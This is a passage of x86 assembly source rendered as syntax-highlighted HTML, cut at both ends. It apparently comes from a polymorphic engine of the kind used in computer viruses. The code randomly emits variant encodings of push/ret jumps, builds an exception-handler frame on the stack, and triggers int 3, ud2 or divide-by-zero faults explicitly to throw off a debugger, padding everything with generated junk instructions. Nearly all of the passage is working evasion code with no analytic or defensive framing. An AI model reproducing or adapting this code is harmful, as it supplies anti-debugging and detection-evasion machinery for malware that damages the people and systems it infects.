    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FixRVA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;offset to jump</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc1">;push 'push offset' &amp; 'ret' instructions to the stack</span><span class="sc0">
    </span><span class="sc1">;way 1:</span><span class="sc0">
    </span><span class="sc1">;   push xxx</span><span class="sc0">
    </span><span class="sc1">;   push xxx</span><span class="sc0">
    </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc1">;   mov reg,xxx</span><span class="sc0">
    </span><span class="sc1">;   push    reg</span><span class="sc0">
    </span><span class="sc1">;   mov reg,xxx</span><span class="sc0">
    </span><span class="sc1">;   push    reg</span><span class="sc0">
    </span><span class="sc1">;way 3:</span><span class="sc0">
    </span><span class="sc1">;   mov reg,xored xxx</span><span class="sc0">
    </span><span class="sc1">;   push    reg</span><span class="sc0">
    </span><span class="sc1">;   xor dword ptr [esp],xored val</span><span class="sc0">
    </span><span class="sc1">;   mov reg,xored xxx</span><span class="sc0">
    </span><span class="sc1">;   push    reg</span><span class="sc0">
    </span><span class="sc1">;   xor dword ptr [esp],xored val</span><span class="sc0">
    </span><span class="sc1">;------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4b0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">I9_A</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;way 1 !!!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;gen push xxx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;gen push xxx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">  
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">I9_Exit</span><span class="sc0">
</span><span class="sc5">I9_A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">320h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">I9_B</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMoveAndPush</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMoveAndPush</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">I9_Exit</span><span class="sc0">
</span><span class="sc5">I9_B</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMoveAndPush</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2434h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">push_and_ret</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMoveAndPush</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2434h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">I9_Exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc1">;gen a SEH frame that jump into the stack</span><span class="sc0">
    </span><span class="sc1">;----------------------------------------</span><span class="sc0">
    </span><span class="sc1">;gen 'push esp'</span><span class="sc0">
    </span><span class="sc1">;way 1:</span><span class="sc0">
    </span><span class="sc1">;   push    esp</span><span class="sc0">
    </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc1">;   mov reg,esp</span><span class="sc0">
    </span><span class="sc1">;   push    reg</span><span class="sc0">
    </span><span class="sc1">;------------------------------------------</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4b0h</span><span class="sc0">            </span><span class="sc1">;get number between 0 ~ 1200</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">258h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_PushEsp1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc0">              </span><span class="sc1">;push   esp</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">___1__</span><span class="sc0">  
</span><span class="sc5">_PushEsp1</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">         </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">              </span><span class="sc1">;move reg,esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;push reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">___1__</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc1">;gen 'push dword ptr fs:[0]'</span><span class="sc0">
    </span><span class="sc1">;way 1:</span><span class="sc0">
    </span><span class="sc1">;   push    dword ptr fs:[0]</span><span class="sc0">
    </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc1">;   xor/sub reg,reg</span><span class="sc0">
    </span><span class="sc1">;   push    dword ptr fs:[reg]</span><span class="sc0">
    </span><span class="sc1">;way 3:</span><span class="sc0">
    </span><span class="sc1">;   xor/sub reg,reg</span><span class="sc0">
    </span><span class="sc1">;   push    dword ptr fs:[reg+reg]</span><span class="sc0">
    </span><span class="sc1">;--------------------------------------------</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4b0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_nW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">36FF6764h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextIns</span><span class="sc0">
</span><span class="sc5">_nW</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">320h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_nW2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenEmptyReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff64h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextIns</span><span class="sc0">
</span><span class="sc5">_nW2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenEmptyReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff64h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">NextIns</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc1">;gen 'mov fs:[0],esp</span><span class="sc0">
    </span><span class="sc1">;way 1:</span><span class="sc0">
    </span><span class="sc1">;   mov fs:[0],esp</span><span class="sc0">
    </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc1">;   xor/sub reg,reg</span><span class="sc0">
    </span><span class="sc1">;   mov fs:[reg],esp</span><span class="sc0">
    </span><span class="sc1">;way 3:</span><span class="sc0">
    </span><span class="sc1">;   mov reg,esp</span><span class="sc0">
    </span><span class="sc1">;   mov fs:[0],reg</span><span class="sc0">
    </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4b0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__nW1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">26896764h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GenF</span><span class="sc0">
</span><span class="sc5">__nW1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">320h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__nW2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenEmptyReg</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9h</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8964h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GenF</span><span class="sc0">
</span><span class="sc5">__nW2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenMovRegEsp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">89676400h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">GenF</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc1">;gen 'page fault',in order to force debugger to jump</span><span class="sc0">
    </span><span class="sc1">;way 1:</span><span class="sc0">
    </span><span class="sc1">;   int 3</span><span class="sc0">
    </span><span class="sc1">;way 2:</span><span class="sc0">
    </span><span class="sc1">;   ud2 -&gt; undefine instruction (0fh,0bh)</span><span class="sc0">
    </span><span class="sc1">;way 3:</span><span class="sc0">
    </span><span class="sc1">;   mov ecx,0\xor ecx,ecx\sub ecx\ecx</span><span class="sc0">
    </span><span class="sc1">;   div ecx</span><span class="sc0">
    </span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">384h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12ch</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_F_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitGF</span><span class="sc0">
</span><span class="sc5">_F_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">258h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_F_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b0fh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitGF</span><span class="sc0">
</span><span class="sc5">_F_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">384h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12ch</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ecx0_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">div_ecx</span><span class="sc0">
</span><span class="sc5">_ecx0_1</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">258h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_ecx0_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c92bh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">div_ecx</span><span class="sc0">
</span><span class="sc5">_ecx0_2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c933h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">div_ecx</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f1f7h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">ExitGF</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">;instructions to generate in the stack:</span><span class="sc0">
    </span><span class="sc5">push_and_ret</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">

    
</span><span class="sc5">_WriteJunkCode</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;gen junk code that dont destroy registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5208h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bb8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_WJC1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenAndReg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitJC</span><span class="sc0">
</span><span class="sc5">_WJC1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1770h</span><span class="sc0">
